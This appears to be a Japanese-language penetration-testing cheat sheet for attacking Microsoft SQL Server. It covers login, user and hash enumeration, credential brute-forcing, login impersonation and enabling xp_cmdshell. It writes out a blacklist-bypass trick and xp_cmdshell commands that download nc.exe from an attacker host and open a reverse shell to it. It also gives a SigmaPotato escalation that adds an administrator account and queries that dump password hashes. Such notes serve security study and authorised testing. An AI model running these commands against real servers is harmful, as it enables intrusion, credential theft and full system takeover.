- 関連ノート
	- [80 or 443 - HTTP or HTTPS](80%20or%20443%20-%20HTTP%20or%20HTTPS.md#SQLi)

- 🔗参考リンク
	- [MSSQL Injection Cheat sheet - pentestmonkey](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
	- [MSSQL (Microsoft SQL Server) - hackviser](https://hackviser.com/tactics/pentesting/services/mssql)

---

# Todo

- [ ] port 1434についてまとめる
- [ ] 以降編集

# 接続方法

接続(Kaliから)
```zsh
# Windows認証（SQL認証でログインできないとき）
impacket-mssqlclient [domain/]<username>@<TargetIP|domain> -port <port> -windows-auth

# SQL認証
impacket-mssqlclient <username>@<TargetIP|domain> -port <port>
```
- Windows認証：Windowsのネットワーク認証（NTLM）プロトコルを使用してログインを試みる（ほとんどこれを使う）
- SQL認証：自分自身の内部DB（SAMやADではなく、SQL Server内のユーザーリスト）に `sql_svc` というユーザーがいないか確認

接続(Windowsから)
	⚠️SQL認証のみ
```powershell
# インタラクティブモード
sqlcmd [-S <TargetIP|domain>] -U <username> -P <pw> -l 30

# 非インタラクティブモード
sqlcmd [-S <TargetIP|domain>] -U <username> -P <pw> -l 30 -Q "<SQL_query>"
```
- ローカルの場合は`-S`はつけない、もしくは `-S 127.0.0.1`とする

>[!WARNING] 注意
>WinRM/リバースシェルなど非インタラクティブシェルのとき、Windows認証で他ユーザーとしてログオンしたいのであれば、[Tunneling Through Deep Packet Inspection](../Stealth&Evasion/Port%20Redirection/Tunneling%20Through%20Deep%20Packet%20Inspection.md)と組み合わせて、`impacket`でアクセスしないと失敗する → RDP/SSH接続であれば、`runas`で対象ユーザーとしてcmdを実行し、`sqlcmd -E`でWindows認証のログオン可能

---
---

# 🔍 Enumeration

## ユーザー情報の列挙

現在のユーザー
```sql
SELECT USER_NAME();
SELECT SYSTEM_USER;
```
- `USER_NAME()`：現在のセッションがマッピングされているDBユーザー名（ログインしたユーザーが現在のDBでどのユーザーとして扱われているか）
- `SYSTEM_USER`：ユーザーがSQL Serverインスタンス自体に接続するために使用したログイン名

現在のユーザーがsystemadmin権限をもつか
```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
```
- 出力が1 → [1433 - MSSQL](#xm_cmdshellの利用手順)

パスワードハッシュの列挙
```sql
-- sysadmin以外は、権限が不足しているため、NULLとなる可能性あり
SELECT name, password FROM master..syslogins
```

現在のユーザーの権限確認
```sql
-- サーバーレベル(mssql server全体における権限)
SELECT * FROM fn_my_permissions(NULL, 'SERVER');  
-- DBレベル(現在のDBにおける権限)
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
```
- ねらい目の権限：

現在のユーザーがImpersonate（なりすまし）可能なユーザーの確認
```sql
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
```
- ↓別のユーザーに成りすましてアクセス権を取得できる
```sql
EXECUTE AS LOGIN = '<impersonate_username>';
-- 成否確認：SELECT SYSTEM_USER;
```

全ユーザー列挙
```sql
SELECT name FROM master.sys.server_principals;  
SELECT name FROM sys.sysusers;  
```

sysadminユーザーの確認
```sql
SELECT name FROM master.sys.server_principals WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1;
```

このデータベースで、どのオブジェクトに、どのようなセキュリティ設定がされているかを確認（オブジェクトごとの詳細な権限設定履歴（GRANT/DENY）を確認）
```sql
EXEC sp_helprotect;
```

## サーバー情報の列挙

バージョン情報表示
```sql
SELECT @@version;
```
- →既知の脆弱性を検索

詳細な製品情報を表示
```sql
SELECT SERVERPROPERTY('ProductVersion'), SERVERPROPERTY('ProductLevel'), SERVERPROPERTY('Edition');
```

サーバー名を表示
```sql
SELECT @@servername;
```

サーバーロール（サーバーに存在する権限）を表示
```sql
SELECT name FROM master.sys.server_principals WHERE type = 'R';
```

DBロールとそのメンバーを確認
```sql
EXEC sp_helprolemember;
```

## DB情報の列挙

現在のセッションで利用可能なデータベース一覧を表示
```sql
SELECT name FROM sys.databases;
```
- デフォルトDB： master, tempdb, model,msdb

現在のDBの確認
```sql
SELECT DB_NAME();
```

DBの総合情報の確認
```sql
SELECT name, database_id, create_date FROM sys.databases;
```

## TableとColumnの列挙

- impacket接続の場合は、バリューが`b'<value>'`の形で表示される

現在のDBにあるtableの確認
```sql
SELECT table_name FROM information_schema.tables;
```

特定tableのcolumn全てを確認
```sql
SELECT column_name, data_type FROM information_schema.columns WHERE table_name = '<table>';
```

特定の用語を含むtableとcolumnの列挙
```sql
SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%password%';
```

## システムテーブル列挙

システムテーブル参照基本構文

1. 閲覧したいデータベースのコンテキストに入る
```sql
USE <database>;
-> #ENVCHANGE(DATABASE): Old Value: <元いたDB>, New Value: <指定したDB>
```

2. システムテーブルを参照する
```sql
SELECT * FROM <システムテーブル>;
```

もしくは...

💡スキーマ省略記法を使い閲覧する（SQLiの際に使うことが多い）
```sql
SELECT * FROM <database>..<table>;
```
🚨：スキーマが`dbo`のものしか表示できない
	`information_schema`など、他のスキーマのテーブルは表示不可

### 補足：システムテーブル周りの基本

| 質問                                                 | 答え                                                                              |
| -------------------------------------------------- | ------------------------------------------------------------------------------- |
| システムテーブルとは？                                        | ・SQL Server がデータベースの中身や設定を管理しているテーブル（例：sysusers）<br>・SQL Server にデフォルトで存在するテーブル |
| ユーザー定義テーブルとは？                                      | 自分で `CREATE TABLE` したテーブル                                                       |
| spt_fallback_db などは？                               | システムが最初から持ってるテーブル（削除不可）                                                         |
| 完全修飾名(ex. `[database].[schema].[table]`でアクセスできるのは？ | ユーザー定義テーブルと一部の新システムビュー                                                          |
| `USE master;` の抜け方は？                               | `USE` で別DBに移動するだけ                                                               |

### 補足：ペンテストの観点で見たシステムテーブルの重要性

| カテゴリ       | テーブル or ビュー                                       | 何が分かる？                  | 攻撃にどう役立つ？                                                                                                                                                                                              |
| ---------- | ------------------------------------------------- | ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| ユーザー一覧     | `sysusers`, `sys.database_principals`             | DB内のユーザー名、ロール、認証方式      | 管理者権限ユーザーの特定、権限昇格狙い                                                                                                                                                                                    |
| ログイン情報     | `syslogins`, `sys.sql_logins`                     | SQL Server ログイン（hash付き） | ハッシュを抜いてパスワードクラック可能<br>`SELECT name,master.sys.fn_varbintohexstr(password_hash) FROM master.sys.sql_logins;`                                                                                           |
| テーブル一覧     | `information_schema.tables`, `sys.tables`         | どんなテーブルがあるか？            | ユーザーデータがどこにあるか探索                                                                                                                                                                                       |
| カラム情報      | `information_schema.columns`, `sys.columns`       | 各テーブルの中身（カラム名）          | `username`, `password`, `email` などを探索                                                                                                                                                                  |
| 実行中クエリ     | `sys.dm_exec_requests`, `sys.dm_exec_sql_text`    | 実行中のSQLを見る              | ログイン中ユーザーの操作内容を監視可能                                                                                                                                                                                    |
| 権限情報       | `fn_my_permissions`, `sys.database_permissions`   | 自分が持ってる権限一覧             | `UNION`, `INSERT`, `xp_cmdshell` 実行可か調査<br><u>①オブジェクト単位</u><br>`SELECT * FROM fn_my_permissions('sys.objects', 'OBJECT');`<br><br><u>②DB単位</u><br>`SELECT * FROM fn_my_permissions(NULL, 'DATABASE');` |
| ストアドプロシージャ | `sys.procedures`, `sysobjects`                    | 登録済みのプロシージャ一覧           | 特権を持つ処理が呼べるか確認（e.g., `xp_cmdshell`）                                                                                                                                                                    |
| ログイン中の接続   | `sys.dm_exec_sessions`, `sys.dm_exec_connections` | 他ユーザーのセッション情報           | 標的選定・セッションハイジャックの可能性                                                                                                                                                                                   |



---
---
# 💥 Exploit

## ログイン試行

パスワードなしログイン試行(`sa`ユーザ)
```zsh
nmap -v -n --script="safe and ms-sql-*" --script-args="mssql.instance-port=[port],mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER" -sV -p <Port> -oA Nmap/safe-ms-sql <TargetIP>
```

クレデンシャルブルートフォース（アカウントロックの危険性有）
	※ ドメインはNetBIOS名を使用：[139,445 -NetBIOS, SMB](139,445%20-NetBIOS,%20SMB.md#Nbtscan)
```zsh
# netexec
netexec mssql -d <domain> -u <username_wordlist> -p <pw_wordlist> <TargetIP>

# nmap
nmap -p <Port> --script ms-sql-brute --script-args mssql.domain=<domain>,userdb=<username_wordlist>,passdb=<pw_wordlist>,ms-sql-brute.brute-windows-accounts <TargetIP>
```

## コマンド実行

単発コマンド:
```zsh
# Username + Password + CMD command
nxc mssql <TargetIP> -u <username> -p '<pw>' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
```

### 対話セッション経由のコマンド実行（xp_cmdshell）

#### エクスプロイトの前提条件

- 役割：SQLからコマンドシェルへ文字列のコマンドをパスし、実行する
- ⚠️注意：デフォルトで無効のオプション
- 必要権限："sysadmin"権限（SQL serverの最上位）
```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
-- 出力
-
1
```

#### ⚠️注意：直前のコマンドの結果は引き継げない

毎回新規のプロセスでコマンドを実行するため。例えば、`cd`の結果は引き継げない。
```zsh
EXECUTE xp_cmdshell 'cd';
output                
-------------------   
C:\Windows\system32   

EXECUTE xp_cmdshell 'cd ../';
output   
------   
NULL     

EXECUTE xp_cmdshell 'cd';
output                
-------------------   
C:\Windows\system32   
```

#### xm_cmdshellの利用手順

1. `xp_cmdshell`が有効か確認：
```sql
SELECT convert(int, isnull(value, value_in_use)) AS cmdshell_enabled FROM sys.configurations WHERE name = N'xp_cmdshell';
```
（`N'xp_cmdshell'`: SQL Server において「Unicode 文字列」を表す特別な記法）

2. `xp_cmdshell`の有効化：
```sql
-- 高度なオプションを表示する設定変更
EXECUTE sp_configure 'show advanced options', 1;

-- 出力：[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.

RECONFIGURE;

-- xp_cmdshellオプションの有効化
EXECUTE sp_configure 'xp_cmdshell', 1;

-- 出力：[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

RECONFIGURE;
```

3. サービスアカウントの確認：
```sql
EXECUTE xp_cmdshell 'whoami';
```

4. ブラックリスト回避（`EXEC xp_cmdshell`がブロックされている場合）：
```sql
DECLARE @x AS VARCHAR(50)='xp_cmdshell'; EXEC @x 'whoami' —
```

5. リバースシェル（Netcat使用）：
```sql
EXEC xp_cmdshell 'powershell iwr -Uri http://<AttackerIP>:<port>/nc.exe -OutFile c:\users\public\nc.exe'
```
```sql
EXEC xp_cmdshell 'c:\users\public\nc.exe -e cmd <AttacerIP> 443'
```
（その他のペイロード：[What is the shell](../Common/What%20is%20the%20shell.md#Base64化したPowerShellリバースシェルワンライナー)）

---

## 特権昇格（Post-Exploitation）

MSSQLサービスを実行しているユーザーは通常 `SeImpersonatePrivilege` を持っているため、これで特権昇格が可能([💥Windows Privilege Escalation](../🪟Windows/💥Windows%20Privilege%20Escalation.md#Token%20Impersonationによる権限昇格))
```sql
-- 1. 権限確認 
EXEC xp_cmdshell 'whoami /priv';
 -- 2. SigmaPotato等をアップロードして実行
EXEC xp_cmdshell 'c:\users\public\SigmaPotato.exe -cmd "net localgroup administrators hackeduser /add"';
```

`sysadmin`権限があれば、全ユーザーのパスワードハッシュをダンプできる
```sql
SELECT name, master.sys.fn_varbintohexstr(password_hash) FROM master.sys.sql_logins;
```